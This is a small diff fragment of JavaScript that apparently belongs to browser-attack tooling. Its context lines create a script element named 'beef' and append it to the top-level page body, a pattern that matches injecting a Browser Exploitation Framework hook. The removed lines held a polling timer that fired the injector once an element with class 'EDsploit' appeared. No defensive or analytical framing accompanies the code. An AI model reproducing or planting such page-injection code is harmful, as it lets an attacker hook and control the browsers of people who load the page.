@@ -50,13 +50,5 @@
 		beef.async = true;
 		window.top.document.body.appendChild(beef);
 	};
-        
-	const c = setInterval(() => {
-		if (window.top.document.body.getElementsByClassName('EDsploit').length > 0) {
-			clearInterval(c);
-			b();
-		}
-	}, 10);
-	
 	return;
 })();
